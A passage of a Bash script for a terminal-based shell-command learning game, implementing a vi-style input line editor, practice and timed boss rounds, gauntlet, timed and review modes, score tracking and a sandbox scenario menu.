    printf '  Time:        %dm %ds\n%s\n' "$m" "$s" "${D}----------------------------------------${N}"
  else
    printf '%s\n' "${D}[quit]${N}"
  fi
  exit 0
}

input="" cursor=0 mode="insert" _rep=""
declare -a UNDO_STACK=()  # Multi-level undo
hdr() {
  local fire=""; ((streak>=FIRE_STREAK)) && fire="  ${Y}${B}*${N}"
  printf '\e[2J\e[H%s\n%s\n%s\n\n' "${W}${B}${PLAYER_NAME:-anon}${N}${fire}" "${B}Level $1: ${LEVEL_NAMES[$1]:-}${N}" "${D}[$2/$3]  Tab=man${N}"
}
qdisp() { bar; printf "\n${C}%s${N}\n\n" "$1"; }
_wrong_feedback() { [[ "${CMD_BELL:-1}" != "0" ]] && printf '\a'; printf '\e[7m'; read -t 0.05 -rsn1 _ ||:; printf '\e[0m'; }
_wrong_show() { _wrong_feedback; [[ -n "$_SANDBOX_OUTPUT" ]] && printf '\n%s %s\n' "${D}output:${N}" "$_SANDBOX_OUTPUT"; printf '%s  %s %s\n\n' "${R}x${N}" "${D}expected:${N}" "${Y}${ans}${N}"; }
bar() { local f e p=$((qi<TOT?qi:TOT)); printf -v f '%*s' "$p" ''; printf -v e '%*s' "$((TOT-p))" ''; printf "${B}[${G}%s${D}%s${B}]${N}" "${f// /█}" "${e// /░}"; }
draw() {
  printf '\e[?25l\r\e[K'  # hide cursor, clear line
  ((VI_MODE)) && [[ $mode != insert ]] && printf '%s' "${R}${PROMPT_CHAR}${N}" || printf '%s' "${W}${PROMPT_CHAR}${N}"
  printf '%s' "$input"
  local _pre="${input:0:cursor}" disp_len=${#input} disp_cur; disp_cur=${#_pre}
  ((disp_cur < disp_len)) && printf '\e[%dD' "$((disp_len - disp_cur))"
  printf '\e[?25h'  # show cursor
}

# Vi helpers (requires UTF-8 locale for proper multi-byte char handling)
_wfwd() { while ((cursor<${#input})) && [[ "${input:cursor:1}" != " " ]]; do ((++cursor)); done; while ((cursor<${#input})) && [[ "${input:cursor:1}" == " " ]]; do ((++cursor)); done; ((cursor>=${#input}&&${#input}>0)) && cursor=$((${#input}-1)); }
_wbck() { ((cursor>0)) && ((cursor--)); while ((cursor>0)) && [[ "${input:cursor:1}" == " " ]]; do ((cursor--)); done; while ((cursor>0)) && [[ "${input:cursor-1:1}" != " " ]]; do ((cursor--)); done; }
_wend() { ((cursor<${#input}-1)) && ((++cursor)); while ((cursor<${#input}-1)) && [[ "${input:cursor:1}" == " " ]]; do ((++cursor)); done; while ((cursor<${#input}-1)) && [[ "${input:cursor+1:1}" != " " ]]; do ((++cursor)); done; }
_clamp() { ((cursor>=${#input})) && cursor=$((${#input}>0?${#input}-1:0)); }
_del() { # $1=motion
  local e=$cursor
  case "$1" in
    d|c) input="" cursor=0;;
    w) while ((e<${#input})) && [[ "${input:e:1}" != " " ]]; do ((++e)); done; input="${input:0:cursor}${input:e}";;
    b) ((e>0)) && ((e--)); while ((e>0)) && [[ "${input:e:1}" == " " ]]; do ((e--)); done; while ((e>0)) && [[ "${input:e-1:1}" != " " ]]; do ((e--)); done; input="${input:0:e}${input:cursor}"; cursor=$e;;
    \$) input="${input:0:cursor}";;
    0) input="${input:cursor}"; cursor=0;;
  esac; _clamp
}

# Read one line of input with vi/insert mode (shared by practice + boss)
# $1: 1=allow manpages, 0=boss mode  $2: 1=allow history, 0=no history
# $3: timeout seconds (0=none). Returns 1 on timeout.
# Caller defines _REDRAW_HDR(). Uses dynamic scoping for ans, HIST, etc.
_read_line() {
  local _rl_hints=${1:-1} _rl_hist=${2:-1} _rl_timeout=${3:-0} _rl_deadline=0
  input="" cursor=0 mode="insert" _rep="" _man_open=0
  UNDO_STACK=()
  local _rl_last_sec=0
  if ((_rl_timeout > 0)); then printf -v _rl_deadline '%(%s)T' -1; ((_rl_deadline += _rl_timeout)); _rl_last_sec=$_rl_deadline; fi
  ((_rl_hist)) && { HIST_IDX=${#HIST[@]}; HIST_SAVE=""; }
  read -t 0.01 -rsn 1000 ||:
  draw
  while true; do
    if ((_rl_deadline)); then
      local _now; printf -v _now '%(%s)T' -1; local _rem=$((_rl_deadline - _now))
      ((_rem <= 0)) && { input=""; return 1; }
      if ((_now != _rl_last_sec)); then _rl_last_sec=$_now; _REDRAW_HDR; draw; fi
      IFS= read -rsn1 -t 1 c || {
        printf -v _now '%(%s)T' -1; _rem=$((_rl_deadline - _now))
        ((_rem <= 0)) && { input=""; return 1; }
        _rl_last_sec=$_now; _REDRAW_HDR; draw; continue
      }
    else
      IFS= read -rsn1 c || break
    fi
    if [[ "$c" == $'\t' ]]; then
      if ((_rl_hints)); then
        ((_man_open)) && _man_open=0 || _man_open=1
        printf '\e[?25l\e[s\n\e[J'  # hide cursor, save pos, clear below
        ((_man_open)) && explain "$ans"
        printf '\e[u\e[?25h'  # restore pos, show cursor
      else printf '\n%s\n' "${R}No manpages in boss mode!${N}"; sleep 0.5; printf '\e[A\e[2K'; fi
      continue
    fi
    if [[ "$mode" == "insert" ]]; then
      case "$c" in
        $'\x04') _quit;;
        $'\x1b')
          local _e1 _e2; read -rsn1 -t 0.01 _e1 || _e1=""
          if [[ "$_e1" == "[" ]]; then
            read -rsn1 -t 0.01 _e2 || _e2=""
            if ((_rl_hist)); then
              case "$_e2" in
                A) ((${#HIST[@]} > 0 && HIST_IDX > 0)) && { ((HIST_IDX==${#HIST[@]})) && HIST_SAVE="$input"; ((HIST_IDX--)); input="${HIST[$HIST_IDX]}"; cursor=${#input}; draw; };;
                B) ((HIST_IDX < ${#HIST[@]})) && { ((++HIST_IDX)); ((HIST_IDX==${#HIST[@]})) && input="$HIST_SAVE" || input="${HIST[$HIST_IDX]}"; cursor=${#input}; draw; };;
              esac
            fi
          elif [[ -z "$_e1" ]] && ((VI_MODE)); then
            mode="normal"; ((cursor>0)) && ((cursor--)); draw
          fi;;
        $'\x7f'|$'\b') ((cursor>0)) && { input="${input:0:cursor-1}${input:cursor}"; ((cursor--)); draw; };;
        '') ((_man_open)) && printf '\e[s\n\e[J\e[u'; _man_open=0; echo; return;;
        *) input="${input:0:cursor}${c}${input:cursor}"; ((++cursor)); draw;;
      esac
    elif ((VI_MODE)); then
      if [[ "$c" =~ ^[1-9]$ ]] || { [[ "$c" == "0" ]] && [[ -n "$_rep" ]]; }; then _rep+="$c"; continue; fi
      local _n=${_rep:-1}; _rep=""
      case "$c" in s|S|x|X|D|C|d|c|r) UNDO_STACK+=("$cursor:$input");; esac
      case "$c" in
        i) mode="insert"; draw;; a) mode="insert"; ((cursor<${#input})) && ((++cursor)); draw;;
        A) mode="insert"; cursor=${#input}; draw;; I) mode="insert"; cursor=0; draw;;
        s) ((${#input}>0)) && input="${input:0:cursor}${input:cursor+1}"; mode="insert"; draw;;
        S) input="" cursor=0 mode="insert"; draw;;
        h) for ((_i=0;_i<_n&&cursor>0;_i++)); do ((cursor--)); done; draw;;
        l) for ((_i=0;_i<_n&&cursor<${#input}-1;_i++)); do ((++cursor)); done; draw;;
        k) ((_rl_hist)) && ((${#HIST[@]}>0&&HIST_IDX>0)) && { ((HIST_IDX==${#HIST[@]})) && HIST_SAVE="$input"; ((HIST_IDX--)); input="${HIST[$HIST_IDX]}"; cursor=${#input}; _clamp; draw; };;
        j) ((_rl_hist)) && ((HIST_IDX<${#HIST[@]})) && { ((++HIST_IDX)); ((HIST_IDX==${#HIST[@]})) && input="$HIST_SAVE" || input="${HIST[$HIST_IDX]}"; cursor=${#input}; _clamp; draw; };;
        0) cursor=0; draw;; \$) cursor=$((${#input}>0?${#input}-1:0)); draw;;
        w) for ((_i=0;_i<_n;_i++)); do _wfwd; done; draw;;
        b) for ((_i=0;_i<_n;_i++)); do _wbck; done; draw;;
        e) for ((_i=0;_i<_n;_i++)); do _wend; done; draw;;
        f) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do for ((p=cursor+1;p<${#input};p++)); do [[ "${input:p:1}" == "$c2" ]] && { cursor=$p; break; }; done; done; draw;;
        F) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do for ((p=cursor-1;p>=0;p--)); do [[ "${input:p:1}" == "$c2" ]] && { cursor=$p; break; }; done; done; draw;;
        t) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do for ((p=cursor+1;p<${#input};p++)); do [[ "${input:p:1}" == "$c2" ]] && { cursor=$((p-1)); break; }; done; done; draw;;
        T) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do for ((p=cursor-1;p>=0;p--)); do [[ "${input:p:1}" == "$c2" ]] && { cursor=$((p+1)); break; }; done; done; draw;;
        x) for ((_i=0;_i<_n&&${#input}>0&&cursor<${#input};_i++)); do input="${input:0:cursor}${input:cursor+1}"; done; _clamp; draw;;
        X) for ((_i=0;_i<_n&&cursor>0;_i++)); do input="${input:0:cursor-1}${input:cursor}"; ((cursor--)); done; draw;;
        D) input="${input:0:cursor}"; ((cursor>0)) && ((cursor--)); draw;;
        C) input="${input:0:cursor}"; mode="insert"; draw;;
        r) IFS= read -rsn1 c2; [[ -n "$c2" && "$c2" != $'\x1b' ]] && { input="${input:0:cursor}${c2}${input:cursor+1}"; draw; };;
        d) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do _del "$c2"; done; draw;;
        c) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do _del "$c2"; done; mode="insert"; draw;;
        u) ((${#UNDO_STACK[@]}>0)) && { local _u="${UNDO_STACK[-1]}"; unset 'UNDO_STACK[-1]'; cursor="${_u%%:*}"; input="${_u#*:}"; draw; };;
        g) IFS= read -rsn1 c2; [[ "$c2" == "g" ]] && { cursor=0; draw; };;
        G) cursor=$((${#input}>0?${#input}-1:0)); draw;;
        $'\x1b') local _e1 _e2; read -rsn1 -t 0.01 _e1 || _e1=""
          if [[ "$_e1" == "[" ]]; then read -rsn1 -t 0.01 _e2 || _e2=""
            if ((_rl_hist)); then case "$_e2" in
              A) ((${#HIST[@]}>0&&HIST_IDX>0)) && { ((HIST_IDX==${#HIST[@]})) && HIST_SAVE="$input"; ((HIST_IDX--)); input="${HIST[$HIST_IDX]}"; cursor=${#input}; _clamp; draw; };;
              B) ((HIST_IDX<${#HIST[@]})) && { ((++HIST_IDX)); ((HIST_IDX==${#HIST[@]})) && input="$HIST_SAVE" || input="${HIST[$HIST_IDX]}"; cursor=${#input}; _clamp; draw; };;
            esac; fi; fi;;
        q) _quit;;
        :) local _vcmd=""; IFS= read -rsn1 -t 1 _vcmd || _vcmd=""
          case "$_vcmd" in
            q) local _vbang=""; IFS= read -rsn1 -t 0.2 _vbang || _vbang=""
              [[ "$_vbang" == "!" ]] && _egg_found vimquit; _quit;;
            w) local _vq=""; IFS= read -rsn1 -t 0.2 _vq || _vq=""
              [[ "$_vq" == "q" ]] && _egg_found vimquit; _quit;;
          esac;;
        \?) ((_rl_hints)) && { printf '\n%s\n%s\n%s\n%s\n' "${D}hl${N} move  ${D}kj${N}/↑↓ history  ${D}wb${N} word  ${D}fFtT${N}+char find  ${D}0\$/gg/G${N} line" "${D}x/X${N} del char  ${D}dw/db/dd${N} del  ${D}cw/cb/cc${N} change  ${D}r${N} replace" "${D}s/S${N} subst  ${D}i/a/I/A${N} insert  ${D}u${N} undo(stack)  ${D}:q/:wq${N} quit" "${D}Tab${N} man  ${D}Ctrl+d${N} quit  ${D}[num]cmd${N} repeat"; read -rsn1; _REDRAW_HDR; draw; };;
        '') ((_man_open)) && printf '\e[s\n\e[J\e[u'; _man_open=0; echo; return;;
      esac
    fi
  done
}

_sdirty=0
_sflush_if_dirty() { ((_sdirty)) && { _sflush; _sdirty=0; }; }
_MODE_TAG=""
_sset() { _hash "$1"; _sc[$REPLY]="$2|$_MODE_TAG"; (( ++_sdirty >= 10 )) && { _sflush; _sdirty=0; }; }
_mode_init() {
  _MODE_TAG=$1
  declare -gA _sc; _sc=()
  [[ -f "$DATA/scores" ]] && while IFS='|' read -r k v; do
    [[ "$k" == "#"* ]] && continue
    _sc[$k]=$v
  done < "$DATA/scores"
  _sget() { _hash "$1"; local _v="${_sc[$REPLY]:-1}"; REPLY="${_v%%|*}"; }
  HIST=() HIST_IDX=0 HIST_SAVE=""
  _interactive=1; _stty_saved=$(stty -g 2>/dev/null) || _stty_saved=""
  ((SANDBOX_MODE)) && _sandbox_init
}
_preq_reset() { ((SANDBOX_MODE && _SANDBOX_DESTRUCTIVE)) && { _sandbox_reset; _SANDBOX_DESTRUCTIVE=0; }; }

run() {
  local lv=$1 boss_only=${2:-0} shuf=() qi=${QI:-0} streak=0
  local -a SEEN_PROMPTS=()
  _mode_init "$lv"

  generate_level "$lv"  # Generate fresh questions for this level
  TOT=${#CURRENT_QUESTIONS[@]}
  # Prioritize by tier: 1 (blank) > 2 (recall) - no tier 0 copy mode
  local t1=() t2=()
  for q in "${CURRENT_QUESTIONS[@]}"; do
    _qparse "$q"
    _sget "$_qprompt"; case "$REPLY" in 0|1) t1+=("$q");; *) t2+=("$q");; esac
  done
  # Shuffle and interleave: tier 1 (learning) prioritized, tier 2 (mastered) mixed in
  local _shuf1=() _shuf2=()
  ((${#t1[@]} > 0)) && { _shuf1=("${t1[@]}"); _fshuffle _shuf1; }
  ((${#t2[@]} > 0)) && { _shuf2=("${t2[@]}"); _fshuffle _shuf2; }
  shuf=()
  local i1=0 i2=0
  while ((i1 < ${#_shuf1[@]} || i2 < ${#_shuf2[@]})); do
    # 2:1 ratio favoring tier 1 (learning), with tier 2 (mastered) mixed in
    if ((i1 < ${#_shuf1[@]} && (i2 >= ${#_shuf2[@]} || RANDOM % 3 != 0))); then
      shuf+=("${_shuf1[$i1]}"); ((++i1))
    elif ((i2 < ${#_shuf2[@]})); then
      shuf+=("${_shuf2[$i2]}"); ((++i2))
    fi
  done
  if ((boss_only)); then
    printf '%s\n' "${W}Straight to boss!${N}"
    sleep 1
  # Safety check: if no questions to practice, skip to boss
  elif ((${#shuf[@]} == 0)); then
    printf '%s\n' "${W}No questions to practice. Straight to boss!${N}"
    sleep 1
  fi
  if ((!boss_only)); then
  while ((qi < ${#shuf[@]})); do
    _preq_reset

    _qparse "${shuf[$qi]}"; local prompt=$_qprompt ans=$_qans
    SEEN_PROMPTS+=("$prompt")  # Track for boss exclusion
    _sget "$prompt"; local tier=$REPLY
    # Fire mode: force tier 2 (pure recall)
    local _real_tier=$REPLY
    ((streak>=FIRE_STREAK)) && tier=2
    HIST=()
    _REDRAW_HDR() { hdr "$lv" "$((qi+1))" "$TOT"; qdisp "$prompt"; }
    _REDRAW_HDR
    while true; do
      _read_line 1 1
      [[ -z "$input" ]] && { draw; continue; }
      if check "$input" "$_qanswers"; then
        [[ -n "$input" ]] && { HIST+=("$input"); HIST_IDX=${#HIST[@]}; HIST_SAVE=""; }
        ((_S_ANSWERED++)); ((_S_CORRECT++)); ((_S_STREAK++))
        ((_S_STREAK > _S_BEST_STREAK)) && _S_BEST_STREAK=$_S_STREAK
        _egg_check streak
        if [[ -n "$_SANDBOX_OUTPUT" ]]; then printf '\n%s\n' "${W}${_SANDBOX_OUTPUT}${N}"; fi
        if ((streak>=FIRE_STREAK)); then
          local _new_tier=$((_real_tier<2?_real_tier+1:2))
          ((_real_tier < 2 && _new_tier >= 2)) && ((_S_MASTERED++))
          printf '\n%s\n' "${Y}${B}* ON FIRE! +2${N}"; ((++streak)); _sset "$prompt" "$_new_tier"
          read -rsp "${D}Press Enter to continue...${N}"
          qi=$((qi+2)); ((qi >= ${#shuf[@]})) && qi=${#shuf[@]}; QI=$qi; save; break
        else
          local _new_tier=$((tier<2?tier+1:2))
          ((tier < 2 && _new_tier >= 2)) && ((_S_MASTERED++))
          printf '\n%s\n' "${G}${B}+${N}"; ((++streak))
          _sset "$prompt" "$_new_tier"
        fi
        read -rsp "${D}Press Enter to continue...${N}"
        ((++qi)); QI=$qi; save; break
      else
        ((_S_ANSWERED++)); _S_STREAK=0; _wrong_show; _egg_check wrong "$input"
        explain "$ans"
        streak=0; _sset "$prompt" "$((tier>0?tier-1:0))"; read -rsp "${D}Press Enter to continue...${N}"
      fi
      _sget "$prompt"; tier=$REPLY; _REDRAW_HDR
    done
  done
  fi  # !boss_only
  # === BOSS ROUND ===
  _boss_splash "$lv"

  # Pick 5 random questions, excluding ones seen during practice (O(n) with assoc array)
  local boss_q=() boss_correct=0 boss_total=$BOSS_TOTAL unseen_q=()
  local -A _seen_map; for s in "${SEEN_PROMPTS[@]}"; do _seen_map[$s]=1; done
  for q in "${CURRENT_QUESTIONS[@]}"; do
    _qparse "$q"
    [[ -z "${_seen_map[$_qprompt]:-}" ]] && unseen_q+=("$q")
  done
  # Use unseen questions if enough, otherwise fall back to all
  if ((${#unseen_q[@]} >= boss_total)); then
    boss_q=("${unseen_q[@]}"); _fshuffle_n boss_q "$boss_total"
  else
    boss_q=("${CURRENT_QUESTIONS[@]}"); _fshuffle_n boss_q "$boss_total"
  fi

  for ((bi=0; bi<${#boss_q[@]}; bi++)); do
    _qparse "${boss_q[$bi]}"; local prompt=$_qprompt ans=$_qans
    [[ -z "$prompt" ]] && { ((boss_total--)); continue; }
    _sget "$prompt"; local _boss_tier=$REPLY
    _REDRAW_HDR() {
      local _t=$BOSS_TIMER
      if ((${_rl_deadline:-0})); then local _n; printf -v _n '%(%s)T' -1; _t=$((_rl_deadline - _n)); ((_t < 0)) && _t=0; fi
      printf '\e[2J\e[H'
      printf '%s  %s\n\n%s\n\n' "${W}${B}═══ BOSS $((bi+1))/${boss_total} ═══${N}" "${W}${_t}s${N}" "${C}${prompt}${N}"
    }
    _REDRAW_HDR
    if _read_line 0 0 "$BOSS_TIMER"; then
      ((_S_ANSWERED++))
      if check "$input" "$_qanswers"; then
        ((++boss_correct)); ((_S_CORRECT++)); ((_S_STREAK++))
        ((_S_STREAK > _S_BEST_STREAK)) && _S_BEST_STREAK=$_S_STREAK
        printf '%s\n' "${G}${B}+${N}"
      else
        _S_STREAK=0; _sset "$prompt" "$((_boss_tier>0?_boss_tier-1:0))"; _wrong_show
        explain "$ans"
      fi
    else
      ((_S_ANSWERED++)); _S_STREAK=0; _sset "$prompt" "$((_boss_tier>0?_boss_tier-1:0))"; _wrong_feedback
      printf '\n%s  %s %s\n\n' "${R}${B}TIME'S UP${N}" "${D}expected:${N}" "${Y}${ans}${N}"; explain "$ans"
    fi
    read -rsp "${D}Press Enter to continue...${N}"
  done

  # Results
  printf '\e[2J\e[H'
  local boss="${BOSS_NAMES[$lv]}"
  if ((boss_correct >= BOSS_THRESHOLD)); then
    ((boss_correct == boss_total)) && _egg_check flawless
    printf '%s\n' "${G}${B}══ ${boss} DEFEATED ══${N}"
    printf '%s\n' "${G}${boss_correct}/${boss_total}${N} correct!"
    printf '%s\n\n' "${W}You acquired: ${LEVEL_NAMES[$lv]}${N}"
    if ((BOSS_BEATEN < lv)); then
      BOSS_BEATEN=$lv; _save_profile
      # Notify about newly unlocked scenarios
      local _si
      for ((_si=1; _si<=SC_TOTAL; _si++)); do
        ((SC_UNLOCK[_si] == lv)) && printf '%s\n' "${Y}★ Scenario unlocked: ${SC_NAMES[$_si]}${N}"
      done
    fi
    if ((lv<MAX_LEVEL)); then
      printf "${D}Press Enter for Level %d...${N}\n" "$((lv+1))"; read -r
      LVL=$((lv+1)); QI=0; save; _sflush_if_dirty; _NEXT_LV=$LVL _NEXT_BOSS=0; return 0
    else
      _victory
      _sflush_if_dirty; return 1
    fi
  else
    printf '%s\n' "${R}${B}══ ${boss} PREVAILS ══${N}"
    printf '%s\n\n' "${R}${boss_correct}/${boss_total}${N} - need $BOSS_THRESHOLD to pass"
    printf '%s\n' "${D}r = retry, p = practice${N}"
    read -rsn1 choice
    case "$choice" in
      r) save; _sflush_if_dirty; _NEXT_LV=$lv _NEXT_BOSS=1; return 0 ;;
      *) save; _sflush_if_dirty; _NEXT_LV=$lv _NEXT_BOSS=0; return 0 ;;
    esac
  fi
}

# Iterative wrapper: replaces recursive run() calls
_run_loop() {
  _session_init
  _NEXT_BOSS=0
  while run "$LVL" "$_NEXT_BOSS"; do LVL=$_NEXT_LV; done
}

_post_root_check() {
  if ((BOSS_BEATEN < MAX_LEVEL)); then
    printf '%s\n' "${R}Locked${N} — beat all 30 bosses to unlock this mode."
    exit 1
  fi
}

gauntlet() {
  _post_root_check
  _session_init
  printf '\e[2J\e[H%s\n%s\n' "${W}${B}═══ GAUNTLET ═══${N}" "${D}3 lives. Questions escalate. How far can you go?${N}"
  ((BEST_GAUNTLET > 0)) && printf '%s\n' "${D}Personal best: ${Y}${BEST_GAUNTLET}${N}"
  printf '\n'; read -rsn1 -p "${D}Press Enter to continue...${N}"; echo

  local lives=3 score=0 streak=0 difficulty=1
  _mode_init g

  while ((lives > 0)); do
    # Pick level based on difficulty (escalates every 5 correct)
    local pick_lv=$((difficulty > MAX_LEVEL ? MAX_LEVEL : difficulty))
    local q_arr=()
    while IFS= read -r line; do [[ -n "$line" ]] && q_arr+=("$line"); done <<< "$(_get_level_questions "$pick_lv")"
    ((${#q_arr[@]} == 0)) && break
    local q_idx=$((RANDOM % ${#q_arr[@]}))
    _qparse "${q_arr[$q_idx]}"; local prompt=$_qprompt ans=$_qans

    local hearts=""; for ((h=0;h<lives;h++)); do hearts+="${R}♥${N} "; done
    _REDRAW_HDR() {
      printf '\e[2J\e[H'
      printf '%s  %s  %s\n' "${W}${B}GAUNTLET${N}" "${B}Score: ${score}${N}" "$hearts"
      printf '%s\n\n' "${D}Level ${pick_lv}: ${LEVEL_NAMES[$pick_lv]:-}${N}"
      printf "${C}%s${N}\n\n" "$prompt"
    }
    _REDRAW_HDR

    _preq_reset
    _read_line 0 1
    if check "$input" "$_qanswers"; then
      [[ -n "$input" ]] && { HIST+=("$input"); HIST_IDX=${#HIST[@]}; HIST_SAVE=""; }
      [[ -n "$_SANDBOX_OUTPUT" ]] && printf '\n%s\n' "${W}${_SANDBOX_OUTPUT}${N}"
      ((++score)); ((++streak))
      ((streak % 5 == 0 && difficulty <= MAX_LEVEL)) && ((++difficulty))
      printf '\n%s\n' "${G}${B}+${N} +1"
    else
      _wrong_show; _egg_check wrong "$input"
      ((lives--)); streak=0
    fi
    read -rsp "${D}Press Enter to continue...${N}"
  done

  _sflush_if_dirty
  printf '\e[2J\e[H'
  printf '%s\n\n' "${R}${B}═══ GAME OVER ═══${N}"
  printf 'Score: %s\n' "${B}${score}${N}"
  if ((score > BEST_GAUNTLET)); then
    printf '%s\n' "${Y}${B}NEW PERSONAL BEST!${N} (was ${BEST_GAUNTLET})"
    BEST_GAUNTLET=$score; _save_profile
  else
    printf '%s\n' "${D}Best: ${BEST_GAUNTLET}${N}"
  fi
  echo
}

timed() {
  _post_root_check
  _session_init
  local duration=${1:-120}
  case "$duration" in 60|120|300) ;; *) printf '%s\n' "${R}Invalid time. Use 60, 120, or 300.${N}"; exit 1;; esac
  printf '\e[2J\e[H%s\n%s\n' "${W}${B}═══ TIMED MODE ═══${N}" "${D}${duration}s on the clock. Answer fast.${N}"
  ((BEST_TIMED > 0)) && printf '%s\n' "${D}Personal best: ${Y}${BEST_TIMED}${N}"
  printf '\n'; read -rsn1 -p "${D}Press Enter to continue...${N}"; echo

  local score=0
  _mode_init t

  local start_t; printf -v start_t '%(%s)T' -1
  local end_t=$((start_t + duration))

  while true; do
    local now_t; printf -v now_t '%(%s)T' -1
    ((now_t >= end_t)) && break
    local remain=$((end_t - now_t))

    # Pick random level from all unlocked
    local pick_lv=$((RANDOM % MAX_LEVEL + 1))
    local q_arr=()
    while IFS= read -r line; do [[ -n "$line" ]] && q_arr+=("$line"); done <<< "$(_get_level_questions "$pick_lv")"
    ((${#q_arr[@]} == 0)) && continue
    local q_idx=$((RANDOM % ${#q_arr[@]}))
    _qparse "${q_arr[$q_idx]}"; local prompt=$_qprompt ans=$_qans

    _REDRAW_HDR() {
      local _now; printf -v _now '%(%s)T' -1; local _rem=$((end_t - _now))
      ((_rem < 0)) && _rem=0
      local _col; ((_rem <= 10)) && _col=$R || { ((_rem <= 30)) && _col=$Y || _col=$G; }
      printf '\e[2J\e[H'
      printf '%s  %s  %s\n' "${W}${B}TIMED${N}" "${B}Score: ${score}${N}" "${_col}${_rem}s${N}"
      printf '%s\n\n' "${D}Level ${pick_lv}: ${LEVEL_NAMES[$pick_lv]:-}${N}"
      printf "${C}%s${N}\n\n" "$prompt"
    }
    _REDRAW_HDR

    _preq_reset

    # Use read with timeout for time pressure
    _read_line 0 1
    printf -v now_t '%(%s)T' -1
    ((now_t >= end_t)) && break

    if check "$input" "$_qanswers"; then
      [[ -n "$input" ]] && { HIST+=("$input"); HIST_IDX=${#HIST[@]}; HIST_SAVE=""; }
      [[ -n "$_SANDBOX_OUTPUT" ]] && printf '\n%s\n' "${W}${_SANDBOX_OUTPUT}${N}"
      ((++score))
      printf '\n%s\n' "${G}${B}+${N} +1"
    else
      _wrong_show
    fi
    read -rsn1 -t 0.3 || true
  done

  _sflush_if_dirty
  printf '\e[2J\e[H'
  printf '%s\n\n' "${W}${B}═══ TIME'S UP! ═══${N}"
  printf 'Score: %s in %ds\n' "${B}${score}${N}" "$duration"
  if ((score > BEST_TIMED)); then
    printf '%s\n' "${Y}${B}NEW PERSONAL BEST!${N} (was ${BEST_TIMED})"
    BEST_TIMED=$score; _save_profile
  else
    printf '%s\n' "${D}Best: ${BEST_TIMED}${N}"
  fi
  echo
}

review() {
  _session_init
  _mode_init rev
  # Find weak levels: mastery < 80%
  local -A lv_total lv_mastered; _calc_mastery _sc
  local weak=()
  if ((_cm_tagged)); then
    for lv in $(seq 1 $((BOSS_BEATEN < 1 ? 1 : BOSS_BEATEN))); do
      local lt=${lv_total[$lv]:-0} lm=${lv_mastered[$lv]:-0}
      ((lt > 0)) && { local pct=$((lm * 100 / lt)); ((pct < 80)) && weak+=("$lv"); }
    done
  fi
  # If no tagged scores or no weak levels, review all unlocked
  if ((${#weak[@]} == 0)); then
    for lv in $(seq 1 $((BOSS_BEATEN < 1 ? 1 : BOSS_BEATEN))); do weak+=("$lv"); done
  fi
  if ((${#weak[@]} == 0)); then
    printf '%s\n' "${D}Nothing to review yet.${N}"; return
  fi
  printf '%s\n' "${B}Review Mode${N} — ${D}practicing ${#weak[@]} weak level(s)${N}"
  sleep 1

  # Gather questions from weak levels
  local all_q=()
  for lv in "${weak[@]}"; do
    local prev_arr=()
    while IFS= read -r line; do [[ -n "$line" ]] && prev_arr+=("$line"); done <<< "$(_get_level_questions "$lv")"
    all_q+=("${prev_arr[@]}")
  done
  _fshuffle all_q
  ((${#all_q[@]} == 0)) && { printf '%s\n' "${D}No questions found.${N}"; return; }

  local qi=0 streak=0 TOT=${#all_q[@]}

  while ((qi < ${#all_q[@]})); do
    _preq_reset
    _qparse "${all_q[$qi]}"; local prompt=$_qprompt ans=$_qans
    _sget "$prompt"; local tier=$REPLY
    HIST=()
    _REDRAW_HDR() {
      printf '\e[2J\e[H'
      printf '%s\n' "${W}${B}${PLAYER_NAME:-anon}${N}"
      printf '%s\n' "${B}Review${N}"
      printf '%s\n\n' "${D}[$((qi+1))/$TOT]  Tab=man${N}"
      qdisp "$prompt"
    }
    _REDRAW_HDR
    while true; do
      _read_line 1 1
      if check "$input" "$_qanswers"; then
        [[ -n "$input" ]] && { HIST+=("$input"); HIST_IDX=${#HIST[@]}; HIST_SAVE=""; }
        ((_S_ANSWERED++)); ((_S_CORRECT++)); ((_S_STREAK++))
        ((_S_STREAK > _S_BEST_STREAK)) && _S_BEST_STREAK=$_S_STREAK
        [[ -n "$_SANDBOX_OUTPUT" ]] && printf '\n%s\n' "${W}${_SANDBOX_OUTPUT}${N}"
        local _new_tier=$((tier<2?tier+1:2))
        ((tier < 2 && _new_tier >= 2)) && ((_S_MASTERED++))
        ((++streak)); _sset "$prompt" "$_new_tier"
        printf '\n%s\n' "${G}${B}+${N}"
        read -rsp "${D}Press Enter to continue...${N}"; ((++qi)); break
      else
        ((_S_ANSWERED++)); _S_STREAK=0; _wrong_show; explain "$ans"
        streak=0; _sset "$prompt" "$((tier>0?tier-1:0))"; read -rsp "${D}Press Enter to continue...${N}"
      fi
      _sget "$prompt"; tier=$REPLY; _REDRAW_HDR
    done
  done
  _sflush_if_dirty
  printf '\e[2J\e[H'
  printf '%s\n' "${G}${B}Review complete!${N}"
  _quit
}

_sc_menu() {
  printf '\e[2J\e[H'
  printf '%s\n' "${W}${B}═══ SCENARIOS ═══${N}"
  printf '%s\n\n' "${D}Multi-step sandbox investigations${N}"
  local i mark req
  for ((i=1; i<=SC_TOTAL; i++)); do
    req=${SC_UNLOCK[$i]:-$MAX_LEVEL}
    if ((BOSS_BEATEN < req)); then
      printf '  %s %d. %s %s\n' "${D}[-]${N}" "$i" "${D}${SC_NAMES[$i]}${N}" "${D}(beat L${req} boss)${N}"
    elif _sc_is_done "$i"; then
      printf '  %s %d. %s\n' "${G}[+]${N}" "$i" "${SC_NAMES[$i]}"
    else
      printf '  %s %d. %s\n' "${Y}[ ]${N}" "$i" "${SC_NAMES[$i]}"
    fi
  done
  printf '\n%s ' "${D}Pick 1-${SC_TOTAL} (q=quit):${N}"
  local choice; read -r choice
  [[ "$choice" == "q" || -z "$choice" ]] && return
  [[ "$choice" =~ ^[1-8]$ ]] && scenario "$choice" || { printf '%s\n' "${R}Invalid choice${N}"; sleep 1; }
}

scenario() {
  local sc_id=${1:-0}
  ((sc_id == 0)) && { _sc_menu; return; }
  ((sc_id < 1 || sc_id > SC_TOTAL)) && { printf '%s\n' "${R}Scenario ${sc_id} does not exist.${N}"; return 1; }
  local _sc_req=${SC_UNLOCK[$sc_id]:-$MAX_LEVEL}
  if ((BOSS_BEATEN < _sc_req)); then
    printf '%s\n' "${R}Locked${N} — beat the Level ${_sc_req} boss (${LEVEL_NAMES[$_sc_req]}) first."
